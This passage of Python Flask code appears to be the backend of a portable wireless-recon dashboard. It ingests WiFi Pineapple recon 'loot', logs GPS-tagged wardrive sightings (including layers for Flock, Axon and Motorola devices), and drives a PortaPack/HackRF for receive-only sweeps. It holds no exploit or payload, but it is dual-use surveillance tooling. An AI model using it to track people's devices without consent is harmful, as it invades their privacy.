    if name:
        _nm(['connection', 'modify', name, 'connection.interface-name', iface])
    ip = _nm_fields(['-f', 'IP4.ADDRESS', 'device', 'show', iface]).get('IP4.ADDRESS', '').split('/')[0]
    log(f'✓ WiFi uplink: joined {ssid} on {iface}')
    return jsonify({'ok': True, 'ssid': ssid, 'ip': ip})

@app.route('/api/wifi/forget', methods=['POST'])
@_nm_error
def wifi_forget():
    name = ((request.json or {}).get('name') or '').strip()
    if name not in {s['name'] for s in _saved_wifi()}:
        return jsonify({'ok': False, 'error': 'Not a saved uplink network'})
    rc, o, e = _nm(['connection', 'delete', name])
    if rc == 0:
        log(f'WiFi uplink: forgot {name}')
    return jsonify({'ok': rc == 0, 'error': '' if rc == 0 else (e or o).strip()})

@app.route('/api/wifi/disconnect', methods=['POST'])
@_nm_error
def wifi_disconnect():
    iface = uplink_iface()
    if not iface:
        return jsonify({'ok': False, 'error': 'No USB WiFi adapter found'})
    rc, o, e = _nm(['device', 'disconnect', iface])
    if rc == 0:
        log(f'WiFi uplink: disconnected {iface}')
    return jsonify({'ok': rc == 0, 'error': '' if rc == 0 else (e or o).strip()})

@app.route('/api/wifi/test', methods=['POST'])
def wifi_test():
    try:
        iface = uplink_iface()
    except FileNotFoundError:
        return jsonify({'ok': False, 'error': 'nmcli not found — apt install network-manager'})
    if not iface:
        return jsonify({'ok': False, 'error': 'No USB WiFi adapter found'})
    try:
        r = subprocess.run(['ping', '-I', iface, '-c', '3', '-W', '2', '1.1.1.1'],
                           capture_output=True, text=True, timeout=15)
    except FileNotFoundError:
        return jsonify({'ok': False, 'error': 'ping not installed — apt install iputils-ping'})
    except subprocess.TimeoutExpired:
        return jsonify({'ok': False, 'error': f'{iface}: no internet (ping timed out)'})
    if r.returncode == 0:
        m = re.search(r'= [\d.]+/([\d.]+)/', r.stdout)
        return jsonify({'ok': True, 'msg': f'{iface} reaches the internet' + (f', avg {m.group(1)} ms' if m else '')})
    return jsonify({'ok': False, 'error': f'{iface}: no internet — check the network it joined'})

@app.route('/api/wifi/ap', methods=['POST'])
@_nm_error
def wifi_ap_password():
    pw = (request.json or {}).get('password') or ''
    if not (8 <= len(pw) <= 63) or not pw.isprintable():
        return jsonify({'ok': False, 'error': 'AP password must be 8-63 printable characters'})
    # hostapd backend: rewrite wpa_passphrase in hostapd.conf, restart the service
    if _hostapd_conf():
        try:
            lines = _read_file(HOSTAPD_CONF).splitlines()
            found = False
            for i, line in enumerate(lines):
                if line.strip().startswith('wpa_passphrase='):
                    lines[i] = f'wpa_passphrase={pw}'
                    found = True
                    break
            if not found:
                lines.append(f'wpa_passphrase={pw}')
            with open(HOSTAPD_CONF, 'w') as f:
                f.write('\n'.join(lines) + '\n')
        except Exception as e:
            return jsonify({'ok': False, 'error': f'Could not write hostapd.conf: {e}'})
        subprocess.Popen(['sh', '-c', 'sleep 2; systemctl restart hostapd'],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        log('AP password changed — restarting hostapd')
        return jsonify({'ok': True, 'msg': 'Saved. The AP restarts in 2 seconds; rejoin with the new password.'})
    # Fallback: NetworkManager-managed AP profile
    rc, o, e = _nm(['connection', 'modify', AP_CON, 'wifi-sec.psk', pw])
    if rc != 0:
        return jsonify({'ok': False, 'error': (e or o).strip()})
    subprocess.Popen(['sh', '-c', f'sleep 2; nmcli connection up {AP_CON}'],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    log('AP password changed — restarting AP')
    return jsonify({'ok': True, 'msg': 'Saved. The AP restarts in 2 seconds; rejoin with the new password.'})


# ── WiFi Pineapple Pager ─────────────────────────────────────────────
# The Pager's recon payload POSTs its JSON loot to /api/remote/pineapple
# with the X-API-Key header. Uploads are kept in captures/pineapple/.
import json as _json

def _extract_aps(body):
    if isinstance(body, list):
        return body
    if isinstance(body, dict):
        for k in ('aps', 'access_points', 'accessPoints', 'networks', 'results', 'data'):
            v = body.get(k)
            if isinstance(v, list):
                return v
            if isinstance(v, dict):
                inner = _extract_aps(v)
                if inner:
                    return inner
    return []

def _norm_ap(ap):
    """Map whatever field names the payload used onto one table shape."""
    if not isinstance(ap, dict):
        return {'ssid': str(ap), 'bssid': '', 'channel': '', 'signal': '',
                'security': '', 'seen': '', 'open': False}
    low = {str(k).lower(): v for k, v in ap.items()}
    def pick(*keys):
        for k in keys:
            v = low.get(k)
            if v not in (None, ''):
                return v
        return ''
    sec_keys = ('encryption', 'security', 'enc', 'auth', 'privacy', 'crypto')
    sec = pick(*sec_keys)
    if isinstance(sec, list):
        sec = ' '.join(map(str, sec))
    sec = str(sec)
    is_open = any(k in low for k in sec_keys) and sec.strip().lower() in ('', 'open', 'none', 'off', '--', 'opn')
    if 'encrypted' in low:
        is_open = not low['encrypted']
        sec = sec or ('encrypted' if low['encrypted'] else 'open')
    return {
        'ssid':     str(pick('ssid', 'essid', 'name', 'network')),
        'bssid':    str(pick('bssid', 'mac', 'address', 'ap_mac')),
        'channel':  str(pick('channel', 'chan', 'ch', 'freq', 'frequency')),
        'signal':   str(pick('signal', 'rssi', 'dbm', 'signal_dbm', 'power', 'strength')),
        'security': sec,
        'seen':     str(pick('last_seen', 'seen', 'timestamp', 'time', 'first_seen')),
        'open':     bool(is_open),
    }

def _ago(ts):
    s = max(0, int(time.time() - ts))
    return f'{s}s' if s < 60 else f'{s // 60}m' if s < 3600 else f'{s // 3600}h' if s < 86400 else f'{s // 86400}d'

def _pager_files():
    d = TOOL_DIRS['pineapple']
    out = []
    try:
        names = sorted((f for f in os.listdir(d) if f.endswith('.json')),
                       key=lambda f: (os.path.getmtime(os.path.join(d, f)), f), reverse=True)
    except OSError:
        return out
    for f in names:
        p = os.path.join(d, f)
        meta = {}
        try:
            with open(p) as fh:
                meta = _json.load(fh)
        except Exception:
            pass
        mt = os.path.getmtime(p)
        out.append({'name': f, 'mtime': mt,
                    'when': datetime.fromtimestamp(mt).strftime('%b %d %H:%M'),
                    'count': meta.get('count', 0) if isinstance(meta, dict) else 0,
                    'source_ip': meta.get('source_ip', '') if isinstance(meta, dict) else ''})
    return out

@app.route('/api/remote/sighting', methods=['POST'])
@require_api_key
def api_remote_sighting():
    """GPS-tagged wardrive sightings from field sensors (T-Pager, field mice).
    Body: {node, ts_ms, items:[{layer,mac,name,rssi,chan,lat,lon,alt,ts}]}.
    Each hit is folded into the sightings DB (so /api/wardrive shows a count),
    written to its layer file, and appended to a per-node WiGLE CSV in
    captures/wardrive so it shows in FILES and uploads to WiGLE with the
    existing button. Layers: wifi, ble, mesh, flock, axon, motorola."""
    import json as _json
    body = request.get_json(force=True, silent=True) or {}
    items = body.get('items', []) if isinstance(body, dict) else []
    if not isinstance(items, list):
        return jsonify({'ok': False, 'error': 'items must be a list'}), 400
    node = re.sub(r'[^A-Za-z0-9_.-]', '_', str(body.get('node', 'sensor')))[:32]

    os.makedirs(TOOL_DIRS['wardrive'], exist_ok=True)
    os.makedirs(TOOL_DIRS['mesh'], exist_ok=True)
    os.makedirs(f'{CAPTURES_BASE}/logs', exist_ok=True)
    db_path = f'{CAPTURES_BASE}/logs/sightings.db'

    # sightings DB: mac|count|first|last|name|band
    db = {}
    try:
        with open(db_path) as f:
            for line in f:
                p = line.rstrip('\n').split('|')
                if len(p) >= 6:
                    db[p[0].lower()] = p
    except Exception:
        pass

    now = int(time.time())
    csv_path = f"{TOOL_DIRS['wardrive']}/{node}-{datetime.now().strftime('%Y%m%d')}.wigle.csv"
    new_csv = not os.path.exists(csv_path)
    layer_counts = {}
    saved = 0

    with open(csv_path, 'a') as csv:
        if new_csv:
            csv.write('WigleWifi-1.4,appRelease=TunnelRAT-Pager,model=TLoraPager,'
                      'release=1.0,device=tunnel-rat,display=,board=ESP32S3,brand=cyberchuck01\n')
            csv.write('MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,'
                      'CurrentLongitude,AltitudeMeters,AccuracyMeters,Type\n')
        for it in items:
            if not isinstance(it, dict):
                continue
            layer = str(it.get('layer', 'wifi'))[:12]
            mac = str(it.get('mac', ''))[:32]
            if not mac:
                continue
            name = str(it.get('name', ''))[:64].replace(',', ' ')
            rssi = it.get('rssi', 0)
            chan = it.get('chan', 0)
            lat = it.get('lat', 0) or 0
            lon = it.get('lon', 0) or 0
            alt = it.get('alt', 0) or 0
            saved += 1
            layer_counts[layer] = layer_counts.get(layer, 0) + 1

            key = mac.lower()
            if key in db:
                row = db[key]
                try:
                    row[1] = str(int(row[1]) + 1)
                except Exception:
                    row[1] = '1'
                row[3] = str(now)
                if name:
                    row[4] = name
                row[5] = layer
            else:
                db[key] = [mac, '1', str(now), str(now), name, layer]

            wtype = {'wifi': 'WIFI', 'ble': 'BLE', 'mesh': 'MESH'}.get(layer, 'WIFI')
            csv.write(f'{mac},{name},[{layer}],{now},{chan},{rssi},{lat},{lon},{alt},10,{wtype}\n')

            if layer in ('mesh', 'flock', 'axon', 'motorola'):
                tdir = TOOL_DIRS['mesh'] if layer == 'mesh' else TOOL_DIRS['wardrive']
                try:
                    with open(f'{tdir}/{layer}-{node}.jsonl', 'a') as x:
                        x.write(_json.dumps({'mac': mac, 'name': name, 'rssi': rssi,
                                             'lat': lat, 'lon': lon, 'alt': alt,
                                             'node': node, 'ts': now, 'layer': layer}) + '\n')
                except Exception:
                    pass

    try:
        with open(db_path, 'w') as f:
            for row in db.values():
                f.write('|'.join(str(x) for x in row[:6]) + '\n')
    except Exception:
        pass

    log(f'\U0001F4E1 sighting upload from {node} ({request.remote_addr}): {saved} hits '
        + ' '.join(f'{k}:{v}' for k, v in layer_counts.items()))
    return jsonify({'ok': True, 'node': node, 'count': saved, 'layers': layer_counts})


@app.route('/api/remote/pineapple', methods=['POST'])
@require_api_key
def pineapple_upload():
    body = request.get_json(force=True, silent=True)
    if body is None:
        return jsonify({'ok': False, 'error': 'Body must be JSON'}), 400
    aps = _extract_aps(body)
    name = request.args.get('name') or (body.get('payload') if isinstance(body, dict) else '') or 'pager-recon'
    safe = re.sub(r'[^A-Za-z0-9_.-]', '_', str(name))[:40]
    os.makedirs(TOOL_DIRS['pineapple'], exist_ok=True)
    path = f"{TOOL_DIRS['pineapple']}/{stamp()}_{safe}.json"
    with open(path, 'w') as f:
        _json.dump({'uploaded_at': datetime.now().isoformat(timespec='seconds'),
                    'source_ip': request.remote_addr, 'name': safe,
                    'count': len(aps), 'data': body}, f, indent=2)
    log(f'🍍 Pager upload from {request.remote_addr}: {len(aps)} APs → pineapple/')
    return jsonify({'ok': True, 'saved': os.path.basename(path), 'count': len(aps)})

@app.route('/api/pineapple/status')
def pineapple_status():
    files = _pager_files()
    if not files:
        return jsonify({'ok': True, 'uploads': 0, 'last_seen': None})
    last = files[0]
    return jsonify({'ok': True, 'uploads': len(files), 'last_seen': last['mtime'],
                    'ago': _ago(last['mtime']), 'last_ip': last['source_ip'],
                    'last_count': last['count']})

@app.route('/api/pineapple/uploads')
def pineapple_uploads():
    return jsonify({'ok': True, 'files': _pager_files()[:50]})

@app.route('/api/pineapple/view')
def pineapple_view():
    name = os.path.basename(request.args.get('file', ''))
    path = os.path.join(TOOL_DIRS['pineapple'], name)
    if not name.endswith('.json') or not os.path.isfile(path):
        return jsonify({'ok': False, 'error': 'Upload not found'})
    try:
        with open(path) as f:
            rec = _json.load(f)
    except Exception as e:
        return jsonify({'ok': False, 'error': f'Could not read upload: {e}'})
    data = rec.get('data', rec) if isinstance(rec, dict) else rec
    aps = [_norm_ap(a) for a in _extract_aps(data)]
    def sig_key(a):
        m = re.search(r'-?\d+(?:\.\d+)?', a['signal'])
        return -float(m.group(0)) if m else 999
    aps.sort(key=sig_key)
    return jsonify({'ok': True, 'aps': aps})


# ═══════════════════════════════════════════════════════════════════════
# v12 — PortaPack H4M / HackRF over USB-C  +  ESP32-MDK GPS over WiFi
# ═══════════════════════════════════════════════════════════════════════
# One USB-C cable, two personalities (never both at once):
#   MAYHEM mode -> the PortaPack exposes Mayhem's USB serial console
#                  (ttyACM*, VID 1d50). The dashboard drives it: screen mirror,
#                  touch, buttons, app launcher, clock sync, shell commands.
#   SDR mode    -> the PortaPack enumerates as a plain HackRF (1d50:6089) and
#                  the NanoPi uses it as a 1 MHz-6 GHz receiver: sweeps, live
#                  waterfall, IQ capture, rtl_433 via SoapySDR.
# Mayhem -> SDR: send `hackrf` over serial.  SDR -> Mayhem: `hackrf_spiflash -R`
# (reboots the PortaPack, which comes back up in Mayhem).
# Receive-only from the dashboard; transmitting stays on the PortaPack itself.
#
# GPS: the MDK's ESP32-S3 joins the tunnel-rat AP and sends raw NMEA over UDP
# to 192.168.50.1:10110. The installer adds that as a gpsd udp:// source, so
# the GPS panel, the wardrive logger and Kismet all see it like any GPS.

import json as _json
import math as _math
import shutil as _shutil
import struct as _struct
import zlib as _zlib

PP_VID       = '1d50'        # OpenMoko VID used by HackRF and PortaPack
HACKRF_PID   = '6089'        # HackRF One / Pro firmware (SDR mode)
MDK_GPS_PORT = int(os.environ.get('TR_MDK_GPS_PORT', '10110'))

pp_lock  = threading.Lock()    # one Mayhem shell conversation at a time
hrf_lock = threading.Lock()    # one HackRF job at a time


# -- USB detection (sysfs only: cheap enough to call on every status poll) --

def _sysfs(path):
    try:
        with open(path) as f:
            return f.read().strip()
    except OSError:
        return ''

def _usb_ids_for(node):
    """Walk up from a sysfs node to its USB device -> (vid, pid, product)."""
    d = os.path.realpath(node)
    while d not in ('/', '/sys', ''):
        if os.path.isfile(os.path.join(d, 'idVendor')):
            return (_sysfs(d + '/idVendor'), _sysfs(d + '/idProduct'),
                    _sysfs(d + '/product'))
        d = os.path.dirname(d)
    return ('', '', '')

def _pp_serial_port():
    """Mayhem's serial console device, or ''. Prefers the installer's
    /dev/portapack symlink, then scans ttyACM* for VID 1d50."""
    if os.path.exists('/dev/portapack'):
        return os.path.realpath('/dev/portapack')
    fallback = ''
    for tty in sorted(glob.glob('/sys/class/tty/ttyACM*')):
        vid, _pid, prod = _usb_ids_for(tty + '/device')
        if vid != PP_VID:
            continue
        dev = '/dev/' + os.path.basename(tty)
        if any(k in prod.lower() for k in ('portapack', 'mayhem', 'hackrf')):
            return dev
        fallback = fallback or dev
    return fallback

def _hackrf_usb():
    """Product string of a HackRF in SDR mode, or ''."""
    for d in glob.glob('/sys/bus/usb/devices/*'):
        if _sysfs(d + '/idVendor') == PP_VID and _sysfs(d + '/idProduct') == HACKRF_PID:
            return _sysfs(d + '/product') or 'HackRF'
    return ''

def _pp_mode():
    port = _pp_serial_port()
    if port:
        return {'mode': 'mayhem', 'port': port}
    prod = _hackrf_usb()
    if prod:
        return {'mode': 'hackrf', 'product': prod}
    return {'mode': 'none'}


# -- Mayhem serial shell (ChibiOS, prompt "ch> ") --

def _pp_clean(text, command):
    """Strip the echoed command and the trailing prompt from a reply."""
    lines = text.replace('\r', '').split('\n')
    if lines and lines[0].rstrip().endswith(command.strip()):
        lines = lines[1:]
    while lines and lines[-1] in ('', 'ch>', 'ch> '):
        lines.pop()
    return '\n'.join(lines)

class _PPLink:
    """Persistent serial session to the PortaPack, reopened on any error."""
    def __init__(self):
        self.ser, self.port = None, ''

    def close(self):
        try:
            if self.ser:
                self.ser.close()
        except Exception:
            pass
        self.ser = None

    def _open(self):
        import serial                       # python3-serial (installer)
        port = _pp_serial_port()
        if not port:
            raise RuntimeError('PortaPack is not in Mayhem mode (no serial console found)')
        if self.ser and self.port == port and self.ser.is_open:
            return
        self.close()
        self.ser = serial.Serial(port, 115200, timeout=0.2, write_timeout=2)
        self.port = port
        time.sleep(0.15)
        self.ser.reset_input_buffer()

    def _read_reply(self, timeout):
        buf, end = bytearray(), time.time() + timeout
        while time.time() < end:
            chunk = self.ser.read(65536)
            if chunk:
                buf += chunk
                # prompt may be followed by stray whitespace; pixel rows only use
                # chars 32-95, so 'ch>' can never be mistaken for screen data
                if buf.rstrip().endswith(b'ch>'):
                    break
        return buf.decode('utf-8', 'replace')

    def cmd(self, command, timeout=5.0, expect_reply=True):
        with pp_lock:
            for attempt in (1, 2):
                try:
                    self._open()
                    self.ser.reset_input_buffer()
                    self.ser.write((command + '\r\n').encode())
                    self.ser.flush()
                    if not expect_reply:
                        return ''
                    return _pp_clean(self._read_reply(timeout), command)
                except ImportError:
                    raise
                except Exception:
                    self.close()
                    if attempt == 2 or not _pp_serial_port():
                        raise
                    time.sleep(0.3)

PP = _PPLink()

def _pp_err(e):
    msg = str(e)
    if isinstance(e, ImportError):
        msg = 'python3-serial is missing — re-run the installer (apt install python3-serial)'
    return jsonify({'ok': False, 'error': msg})


# -- Screen capture --
# screenframeshort: 1 char per pixel, value = 0b00RRGGBB + 32 (64 colours).
# screenframe: full colour hex per pixel (used for saved screenshots).

def _pp_frame_short():
    raw = PP.cmd('screenframeshort', timeout=8)
    rows = [r for r in raw.split('\n') if len(r) >= 100]
    if not rows:
        raise RuntimeError('No screen data — update Mayhem (the serial screen '
                           'commands need a 2.x firmware)')
    w = max(len(r) for r in rows)
    return w, len(rows), [r.ljust(w) for r in rows]

def _short_rows_to_rgb(rows):
    lut = [bytes((((v >> 4) & 3) * 85, ((v >> 2) & 3) * 85, (v & 3) * 85))
           for v in range(64)]
    return [b''.join(lut[min(63, max(0, ord(c) - 32))] for c in r) for r in rows]

def _pp_frame_rgb():
    """Full-colour frame -> (w, h, [rgb bytes per row]). Falls back to the
    64-colour frame if the full one can't be parsed."""
    hexd = set('0123456789abcdefABCDEF')
    try:
        raw = PP.cmd('screenframe', timeout=20)
        rows = [r.strip() for r in raw.split('\n')]
        rows = [r for r in rows if len(r) >= 200 and set(r) <= hexd]
        if rows:
            n = len(rows[0])
            # 2 hex chars per channel (6/pixel) or 1 per channel (3/pixel)
            for cpp in (6, 3):
                if n % cpp == 0 and n // cpp in (240, 320, 480):
                    w, step = n // cpp, cpp // 3
                    out = []
                    for r in rows:
                        r = r[:n].ljust(n, '0')
                        vals = [int(r[i:i + step], 16) * (17 if step == 1 else 1)
                                for i in range(0, n, step)]
                        out.append(bytes(vals))
                    return w, len(out), out
    except Exception:
        pass
    w, h, rows = _pp_frame_short()
    return w, h, _short_rows_to_rgb(rows)

def _png_bytes(w, h, rgb_rows):
    """Tiny RGB PNG encoder (no PIL needed)."""
    def chunk(tag, data):
        c = tag + data
        return _struct.pack('>I', len(data)) + c + _struct.pack('>I', _zlib.crc32(c) & 0xffffffff)
    raw = b''.join(b'\x00' + r.ljust(w * 3, b'\x00')[:w * 3] for r in rgb_rows)
    return (b'\x89PNG\r\n\x1a\n'
            + chunk(b'IHDR', _struct.pack('>IIBBBBB', w, h, 8, 2, 0, 0, 0))
            + chunk(b'IDAT', _zlib.compress(raw, 6))
            + chunk(b'IEND', b''))


# -- PortaPack routes --

@app.route('/api/pp/status')
def pp_status():
    st = _pp_mode()
    st['live'] = _hrf_live_running()
    return jsonify(st)

@app.route('/api/pp/mode', methods=['POST'])
@require_api_key
def pp_mode_switch():
    target = (request.get_json(silent=True) or {}).get('mode')
    cur = _pp_mode()['mode']
    if target not in ('hackrf', 'mayhem'):
        return jsonify({'ok': False, 'error': 'mode must be hackrf or mayhem'})
    if cur == target:
        return jsonify({'ok': True, 'msg': f'Already in {target} mode'})
    if cur == 'none':
        return jsonify({'ok': False, 'error': 'PortaPack not detected — plug its USB-C into the hub and power it on'})

    if target == 'hackrf':
        try:
            PP.cmd('hackrf', expect_reply=False)
        except Exception as e:
            return _pp_err(e)
        PP.close()
        for _ in range(20):
            time.sleep(0.5)
            if _hackrf_usb():
                log('PortaPack → SDR mode (HackRF)')
                return jsonify({'ok': True, 'msg': 'SDR mode — the NanoPi now sees it as a HackRF.'})
        return jsonify({'ok': True, 'msg': 'Command sent; still waiting for it to show up as a HackRF. Refresh in a few seconds.'})

    _hrf_live_stop()
    try:
        r = subprocess.run(['hackrf_spiflash', '-R'], capture_output=True, text=True, timeout=15)
    except FileNotFoundError:
        return jsonify({'ok': False, 'error': 'hackrf tools missing — re-run the installer'})
    except subprocess.TimeoutExpired:
        return jsonify({'ok': False, 'error': 'hackrf_spiflash -R timed out — press the PortaPack reset button instead'})
    for _ in range(30):
        time.sleep(0.5)
        if _pp_serial_port():
            log('PortaPack → Mayhem mode')
            return jsonify({'ok': True, 'msg': 'Rebooted into Mayhem — remote control ready.'})
    detail = (r.stdout + r.stderr).strip()[-300:]
    return jsonify({'ok': True, 'msg': 'Reset sent; waiting for Mayhem to boot. Refresh in a few seconds.'
                    + (f'\n{detail}' if detail else '')})

@app.route('/api/pp/cmd', methods=['POST'])
@require_api_key
def pp_cmd():
    body = request.get_json(silent=True) or {}
    c = (body.get('cmd') or '').strip()
    if not c or len(c) > 200 or '\r' in c or '\n' in c:
        return jsonify({'ok': False, 'error': 'One command per send (max 200 chars)'})
    first = c.split()[0]
    if first == 'hackrf':
        return jsonify({'ok': False, 'error': 'Use the "SDR mode" button for that (it tracks the switch).'})
    no_reply = first in ('reboot', 'dfu', 'sd_over_usb', 'exit')
    try:
        out = PP.cmd(c, timeout=8, expect_reply=not no_reply)
        if no_reply:
            PP.close()
            out = f'Sent "{c}" — the serial console will drop.'
        log(f'PortaPack shell: {c}')
        return jsonify({'ok': True, 'output': out[-20000:] or '(no output)'})
    except Exception as e:
        return _pp_err(e)

@app.route('/api/pp/screen')
@require_api_key
def pp_screen():
    try:
        w, h, rows = _pp_frame_short()
        return jsonify({'ok': True, 'w': w, 'h': h, 'rows': rows})
    except Exception as e:
        return _pp_err(e)

@app.route('/api/pp/screenshot', methods=['POST'])
@require_api_key
def pp_screenshot():
    try:
        w, h, rgb = _pp_frame_rgb()
        d = TOOL_DIRS['portapack']
        os.makedirs(d, exist_ok=True)
        path = f'{d}/{stamp()}_portapack-screen.png'
        with open(path, 'wb') as f:
            f.write(_png_bytes(w, h, rgb))
        log(f'PortaPack screenshot → portapack/{os.path.basename(path)}')
        return jsonify({'ok': True, 'saved': path, 'w': w, 'h': h})
    except Exception as e:
        return _pp_err(e)

@app.route('/api/pp/touch', methods=['POST'])
@require_api_key
def pp_touch():
    b = request.get_json(silent=True) or {}
    try:
        x, y = int(b.get('x')), int(b.get('y'))
    except (TypeError, ValueError):
        return jsonify({'ok': False, 'error': 'bad coordinates'})
    if not (0 < x < 1000 and 0 < y < 1000):
        return jsonify({'ok': False, 'error': 'coordinates out of range'})
    try:
        PP.cmd(f'touch {x} {y}', timeout=2)
        return jsonify({'ok': True})
    except Exception as e:
        return _pp_err(e)

PP_BUTTONS = {'right': 1, 'left': 2, 'down': 3, 'up': 4, 'ok': 5, 'rotl': 7, 'rotr': 8}

@app.route('/api/pp/button', methods=['POST'])
@require_api_key
def pp_button():
    n = PP_BUTTONS.get((request.get_json(silent=True) or {}).get('button', ''))
    if not n:
        return jsonify({'ok': False, 'error': 'unknown button'})
    try:
        PP.cmd(f'button {n}', timeout=2)
        return jsonify({'ok': True})
    except Exception as e:
        return _pp_err(e)

@app.route('/api/pp/apps')
@require_api_key
def pp_apps():
    try:
        raw = PP.cmd('applist', timeout=6)
    except Exception as e:
        return _pp_err(e)
    apps = []
    for line in raw.split('\n'):
        line = line.strip()
        if not line or line.startswith(('ch>', 'applist')):
            continue
        apps.append({'id': line.split()[0], 'label': line})
    return jsonify({'ok': True, 'apps': apps})

@app.route('/api/pp/appstart', methods=['POST'])
@require_api_key
def pp_appstart():
    app_id = ((request.get_json(silent=True) or {}).get('app') or '').strip()
    if not re.fullmatch(r'[A-Za-z0-9_.\-]{1,40}', app_id):
        return jsonify({'ok': False, 'error': 'pick an app from the list first'})
    try:
        out = PP.cmd(f'appstart {app_id}', timeout=4)
        log(f'PortaPack app: {app_id}')
        return jsonify({'ok': True, 'output': out or f'Started {app_id}'})
    except Exception as e:
        return _pp_err(e)

@app.route('/api/pp/rtcsync', methods=['POST'])
@require_api_key
def pp_rtcsync():
    from datetime import timezone
    t = datetime.now(timezone.utc)
    try:
        out = PP.cmd(f'rtcset {t.year} {t.month} {t.day} {t.hour} {t.minute} {t.second}', timeout=3)
        log('PortaPack clock synced (UTC)')
        return jsonify({'ok': True, 'output': out or f'Clock set to {t:%Y-%m-%d %H:%M:%S} UTC'})
    except Exception as e:
        return _pp_err(e)


# -- GPS (gpsd: USB u-blox + the MDK's UDP feed) --

def _gpsd_raw(timeout=2.5):
    """WATCH + POLL against gpsd; returns the raw JSON lines ('' if gpsd is
    up but silent, None if gpsd isn't reachable)."""
    import socket
    data = ''
    try:
        s = socket.create_connection(('localhost', 2947), timeout=timeout)
        s.settimeout(timeout)
        s.sendall(b'?WATCH={"enable":true,"json":true};\n')
        deadline, polled = time.time() + timeout, False
        while time.time() < deadline:
            if not polled and '"class":"WATCH"' in data:
                s.sendall(b'?POLL;\n')
                polled = True
            try:
                chunk = s.recv(8192).decode('utf-8', 'ignore')
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
            if '"class":"POLL"' in data and data.endswith('\n'):
                break
        s.close()
    except OSError:
        return None
    return data

def _gps_source_label(dev):
    if dev.startswith('udp://'):
        return 'MDK (WiFi)'
    return ('USB ' + os.path.basename(dev)) if dev else '?'

def _gps_parse(raw):
    devices, best = [], None
    for line in (raw or '').splitlines():
        try:
            j = _json.loads(line)
        except ValueError:
            continue
        cls = j.get('class')
        if cls == 'DEVICES':
            devices = [{'path': d.get('path', ''), 'driver': d.get('driver', '')}
                       for d in j.get('devices', [])]
        tpvs = [j] if cls == 'TPV' else (j.get('tpv') or []) if cls == 'POLL' else []
        for t in tpvs:
            if (t.get('mode', 0) >= 2 and isinstance(t.get('lat'), (int, float))
                    and isinstance(t.get('lon'), (int, float))):
                if best is None or t['mode'] > best['mode']:
                    best = t
    fix = None
    if best:
        fix = {'lat': round(best['lat'], 6), 'lon': round(best['lon'], 6),
               'mode': best['mode'], 'source': _gps_source_label(best.get('device', ''))}
    return devices, fix

def _gps_fix():
    return _gps_parse(_gpsd_raw())[1]

@app.route('/api/gps/status')
def gps_status():
    raw = _gpsd_raw()
    devices, fix = _gps_parse(raw)
    return jsonify({'gpsd': raw is not None, 'devices': devices, 'fix': fix,
                    'port': MDK_GPS_PORT})


# -- HackRF SDR (receive only) --

def _hrf_gains(b):
    lna = int(b.get('lna', 32)); vga = int(b.get('vga', 20))
    lna = max(0, min(40, lna - lna % 8))
    vga = max(0, min(62, vga - vga % 2))
    return lna, vga, 1 if b.get('amp') in (1, '1', True, 'true') else 0

def _hrf_bin(span_mhz):
    """~1500 bins across the span, within what hackrf_sweep accepts."""
    return int(max(10000, min(1000000, span_mhz * 1e6 / 1500)))

def _sweep_points(lines, lo_hz, hi_hz):
    """hackrf_sweep CSV lines -> sorted [(freq_hz, dB)] (bin centres)."""
    pts = {}
    for line in lines:
        p = line.strip().split(',')
        if len(p) < 7:
            continue
        try:
            low, step = float(p[2]), float(p[4])
            for i, v in enumerate(p[6:]):
                f, val = low + (i + 0.5) * step, float(v)
                if lo_hz <= f <= hi_hz and _math.isfinite(val):
                    pts[int(f)] = val
        except ValueError:
            continue
    return sorted(pts.items())

def _downsample(pts, n):
    """Max-pool to n points so peaks survive the squeeze."""
    if len(pts) <= n:
        return pts
    out, k = [], len(pts) / n
    for i in range(n):
        seg = pts[int(i * k):max(int((i + 1) * k), int(i * k) + 1)]
        out.append((seg[len(seg) // 2][0], max(s[1] for s in seg)))
    return out

def _peaks(pts, count=8):
    if not pts:
        return []
    gap = max(1.0, (pts[-1][0] - pts[0][0]) / 60)
    picked = []
    for f, v in sorted(pts, key=lambda t: -t[1]):
        if all(abs(f - pf) > gap for pf, _ in picked):
            picked.append((f, v))
            if len(picked) >= count:
                break
    return [[round(f / 1e6, 4), round(v, 1)] for f, v in picked]

def _need_sdr_mode():
    if _pp_mode()['mode'] != 'hackrf':
        return jsonify({'ok': False, 'error': 'PortaPack is not in SDR mode — tap "SDR mode" first.'})
    return None

@app.route('/api/hackrf/sweep', methods=['POST'])
@require_api_key
def hackrf_sweep_once():
    b = request.get_json(silent=True) or {}
    try:
        lo, hi = int(b.get('start', 1)), int(b.get('stop', 6000))
    except (TypeError, ValueError):
        return jsonify({'ok': False, 'error': 'start/stop must be whole MHz'})
    if not (1 <= lo < hi <= 6000):
        return jsonify({'ok': False, 'error': 'Range is 1–6000 MHz with start < stop'})
    # Small clients (the PicoCalc) ask for fewer points: one per screen column.
    try:
        npts = max(50, min(1500, int(b.get('points', 1500))))
    except (TypeError, ValueError):
        npts = 1500
    err = _need_sdr_mode()
    if err:
        return err
    _hrf_live_stop()
    lna, vga, amp = _hrf_gains(b)
    binw = _hrf_bin(hi - lo)
    tmp = '/tmp/tr_hackrf_sweep.csv'
    try:
        os.remove(tmp)
    except OSError:
        pass
    cmd = ['hackrf_sweep', '-f', f'{lo}:{hi}', '-w', str(binw), '-l', str(lna),
           '-g', str(vga), '-a', str(amp), '-1', '-r', tmp]
    with hrf_lock:
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=45)
        except FileNotFoundError:
            return jsonify({'ok': False, 'error': 'hackrf_sweep missing — re-run the installer'})
        except subprocess.TimeoutExpired:
            return jsonify({'ok': False, 'error': 'Sweep timed out'})
    try:
        with open(tmp) as f:
            lines = f.readlines()
    except OSError:
        lines = []
    pts = _sweep_points(lines, lo * 1e6, hi * 1e6)
    if not pts:
        return jsonify({'ok': False, 'error': 'No sweep data',
                        'detail': (r.stdout + r.stderr).strip()[-500:]})
    os.makedirs(TOOL_DIRS['sdr'], exist_ok=True)
    saved = f"{TOOL_DIRS['sdr']}/{stamp()}_hackrf-sweep_{lo}-{hi}MHz.csv"
    _shutil.copy(tmp, saved)
    gps = _gps_fix()
    if gps:
        with open(saved[:-4] + '_gps.txt', 'w') as f:
            f.write(f"lat={gps['lat']}\nlon={gps['lon']}\nsource={gps['source']}\n")
